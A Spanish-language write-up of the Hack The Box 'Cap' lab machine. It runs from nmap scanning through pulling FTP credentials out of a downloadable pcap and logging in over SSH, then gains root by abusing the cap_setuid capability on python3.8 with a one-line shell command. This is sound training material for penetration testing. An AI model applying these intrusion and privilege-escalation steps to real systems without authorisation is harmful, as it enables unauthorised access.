# CAP

## Reconocimiento

### Nmap
Lo primero que haremos será enumerar los puertos abiertos en la máquina víctima, para ello usaremos [nmap](https://github.com/nmap/nmap), al que le indicaremos que queremos filtrar el rango de puertos completo, que solo nos muestre los puertos que estén abiertos y que usaremos el método de enumeración TCP Syn Port Scan. Opcionalmente se pueden desactivar el descubrimiento de hosts y la resolución DNS para agilizar el escaneo. Por último, exportaremos las evidencias al fichero allPorts:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 10.10.10.245
```

```bash
File: allPorts

# Nmap 7.91 scan initiated Wed Jun 16 15:16:51 2021 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 10.10.10.245
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.245 ()	Status: Up
Host: 10.10.10.245 ()	Ports: 21/open/tcp//ftp///, 22/open/tcp//ssh///, 80/open/tcp//http///
# Nmap done at Wed Jun 16 15:17:06 2021 -- 1 IP address (1 host up) scanned in 14.17 seconds
```

<br>

Efectuaremos un escaneo más exhaustivo para ver los servicios y versiones que corren bajo estos puertos abiertos, exportaremos las evidencias al fichero targeted:

```bash
nmap -sC -sV -p21,22,80 -oN targeted 10.10.10.245
```

```bash
File: targeted

# Nmap 7.91 scan initiated Wed Jun 16 15:17:36 2021 as: nmap -sC -sV -p21,22,80 -oN targeted 10.10.10.245
Nmap scan report for 10.10.10.245
Host is up (0.15s latency).


PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    gunicorn
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     Server: gunicorn
|     Date: Wed, 16 Jun 2021 13:29:57 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Wed, 16 Jun 2021 13:29:51 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 19386
|     <!DOCTYPE html>
|     <html class="no-js" lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Security Dashboard</title>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <link rel="shortcut icon" type="image/png" href="/static/images/icon/favicon.ico">
|     <link rel="stylesheet" href="/static/css/bootstrap.min.css">
|     <link rel="stylesheet" href="/static/css/font-awesome.min.css">
|     <link rel="stylesheet" href="/static/css/themify-icons.css">
|     <link rel="stylesheet" href="/static/css/metisMenu.css">
|     <link rel="stylesheet" href="/static/css/owl.carousel.min.css">
|     <link rel="stylesheet" href="/static/css/slicknav.min.css">
|     <!-- amchar
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Wed, 16 Jun 2021 13:29:52 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, HEAD, OPTIONS
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Content-Type: text/html
|     Content-Length: 196
|     <html>
|     <head>
|     <title>Bad Request</title>
|     </head>
|     <body>
|     <h1><p>Bad Request</p></h1>
|     Invalid HTTP Version &#x27;Invalid HTTP Version: &#x27;RTSP/1.0&#x27;&#x27;
|     </body>
|_    </html>
|_http-server-header: gunicorn
|_http-title: Security Dashboard
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.91%I=7%D=6/16%Time=60C9F9F7%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,2FE5,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20
SF:Wed,\x2016\x20Jun\x202021\x2013:29:51\x20GMT\r\nConnection:\x20close\r\
SF:nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20193
SF:86\r\n\r\n<!DOCTYPE\x20html>\n<html\x20class=\"no-js\"\x20lang=\"en\">\
SF:n\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x2
SF:0<meta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\x20\
SF:x20\x20\x20<title>Security\x20Dashboard</title>\n\x20\x20\x20\x20<meta\
SF:x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-scale=
SF:1\">\n\x20\x20\x20\x20<link\x20rel=\"shortcut\x20icon\"\x20type=\"image
SF:/png\"\x20href=\"/static/images/icon/favicon\.ico\">\n\x20\x20\x20\x20<
SF:link\x20rel=\"stylesheet\"\x20href=\"/static/css/bootstrap\.min\.css\">
SF:\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/fon
SF:t-awesome\.min\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20
SF:href=\"/static/css/themify-icons\.css\">\n\x20\x20\x20\x20<link\x20rel=
SF:\"stylesheet\"\x20href=\"/static/css/metisMenu\.css\">\n\x20\x20\x20\x2
SF:0<link\x20rel=\"stylesheet\"\x20href=\"/static/css/owl\.carousel\.min\.
SF:css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/c
SF:ss/slicknav\.min\.css\">\n\x20\x20\x20\x20<!--\x20amchar")%r(HTTPOption
SF:s,B3,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Wed,\x2
SF:016\x20Jun\x202021\x2013:29:52\x20GMT\r\nConnection:\x20close\r\nConten
SF:t-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20GET,\x20HEAD,\x20OP
SF:TIONS\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,121,"HTTP/1\.1\x2
SF:0400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20text
SF:/html\r\nContent-Length:\x20196\r\n\r\n<html>\n\x20\x20<head>\n\x20\x20
SF:\x20\x20<title>Bad\x20Request</title>\n\x20\x20</head>\n\x20\x20<body>\
SF:n\x20\x20\x20\x20<h1><p>Bad\x20Request</p></h1>\n\x20\x20\x20\x20Invali
SF:d\x20HTTP\x20Version\x20&#x27;Invalid\x20HTTP\x20Version:\x20&#x27;RTSP
SF:/1\.0&#x27;&#x27;\n\x20\x20</body>\n</html>\n")%r(FourOhFourRequest,189
SF:,"HTTP/1\.0\x20404\x20NOT\x20FOUND\r\nServer:\x20gunicorn\r\nDate:\x20W
SF:ed,\x2016\x20Jun\x202021\x2013:29:57\x20GMT\r\nConnection:\x20close\r\n
SF:Content-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20232\
SF:r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x203\.2\x20
SF:Final//EN\">\n<title>404\x20Not\x20Found</title>\n<h1>Not\x20Found</h1>
SF:\n<p>The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20ser
SF:ver\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x20ch
SF:eck\x20your\x20spelling\x20and\x20try\x20again\.</p>\n");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel


Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jun 16 15:19:47 2021 -- 1 IP address (1 host up) scanned in 131.37 seconds
```

<br>

Como vemos, tenemos abiertos el puerto 21 (FTP), el puerto 22 (SSH) y el puerto 80 (HTTP).

<br>

### Servidor web
Comenzaremos enumerando el servicio web. 

Nos encontraremos con distintos apartados en la página web. Visitando cada uno de ellos podremos ver que algunos de ellos nos reportan información relevante de la máquina, pero el servicio que más nos llama la atención es el de poder descargarnos capturas de red de la máquina víctima:

<img src="https://i.imgur.com/4IlbOvq.png" width=700>

Como vemos, al acceder al apartado de las capturas de red podremos ver que la captura que tenemos opción de descargar estará vacía. En este punto, nos fijaremos en la URL:

<img src="https://i.imgur.com/gestKZx.png" width=200>

Parece que las capturas se encuentran en el directorio data y que en este caso estamos visualizando la captura número 23.

Probaremos a enumerar diferentes capturas de red. Suponiendo que las capturas están ordenadas consecutivamente y en orden ascendente trataremos de listar alguna de ellas. Empezaremos por la captura 0:

<img src="https://i.imgur.com/1Lwbz4p.png" width=700>

Podemos ver que la captura número 0 sí contiene datos por lo que trataremos de descargarla.

<br>

### Wireshark
Al descargarnos el archivo veremos que se llama 0 y su extension es .pcap lo que significa que es una captura de red. Procederemos a abrirlo con [Wireshark](https://www.wireshark.org/download.html):

<img src="https://i.imgur.com/kxbZQf1.png" width=700>

Nos encontraremos con distintos protocolos, pero habrá uno que nos llame la atención, el protocolo FTP. Recordando la fase de reconocimiento inicial, teníamos habilitado el servicio FTP y como sabemos, el protocolo FTP no está encriptado, por lo tanto, podremos visualizar sus mensajes de control.

Nos encontraremos con credenciales de acceso al servicio FTP, estas credenciales son:

```plaintext
ftp_ssh_Creds

nathan:Buck3tH4TF0RM3!
```

Probaremos a conectarnos con ellas:

<img src="https://i.imgur.com/K6aBaD6.png" width=700>

<br>

## Shell de usuario

### FTP
Como vemos, tenemos acceso al servicio FTP con las credenciales que hemos conseguido. Además, el servidor FTP se aloja en el directorio home del usuario nathan, por lo que podremos ver la flag user.txt.

En este punto tendremos capacidad de lectura en la máquina víctima pero no contaremos con una shell. Por lo tanto intentaremos conseguir una reverse shell.

<br>

### SSH
Recordando, teníamos abierto el puerto 22 (SSH), trataremos de conectarnos con las mismas credenciales con las que nos hemos conectado al servicio FTP:

```plaintext
ftp_ssh_Creds

nathan:Buck3tH4TF0RM3!
```

<br>

<img src="https://i.imgur.com/UPwkws3.png" width=700>

Como vemos conseguimos una shell como el usuario nathan a traves del servicio SSH.

<br>

## Shell de administrador

### Enumeración
Empezaremos enumerando el sistema para tratar de escalar privilegios.

Lo primero que haremos será comprobar si tenemos permisos para ejecutar programas como el usuario root o si tenemos archivos con permisos SUID en el sistema, por desgracia no encontraremos nada que nos sirva.

<br>

### Capabilities
Otra cosa interesante que tendremos que comprobar a la hora de enumerar un sistema para escalar privilegios serán las capabilities. Estas capabilities nos permitirán ejecutar ciertas órdenes privilegiadas sin ser el usuario root.

Ayudándonos de la función getcap enumeraremos las capabilities de todos los binarios del sistema. Para ello:

```bash
getcap -r / 2>/dev/null
```

<img src="https://i.imgur.com/dIhvcNT.png" width=700>

Como vemos tenemos unas capabilities curiosas en el binario de Python 3.8. Tenemos la capabilitie cap_setuid que nos permitirá cambiar el uid bajo el que se ejecutara Python, también tendremos la capabilitie cap_net_bind_service que nos permitirá bindear puertos privilegiados (menores a 1024).

<br>

### Shell spwaning
Para conseguir una shell como root nos aprovecharemos de la capabilitie cap_setuid que nos permitirá ejecutar comandos de Python como el usuario root.

Ejecutaremos el siguiente comando para spawnearnos una shell como el usuario root:

```bash
python3.8 -c "import os; os.setuid(0); os.system('/bin/bash')"
```

<img src="https://i.imgur.com/KZEir9X.png" width=500>

Una vez conseguida la shell como el usuario root procederemos a visualizar la flag root.txt en el directorio /root.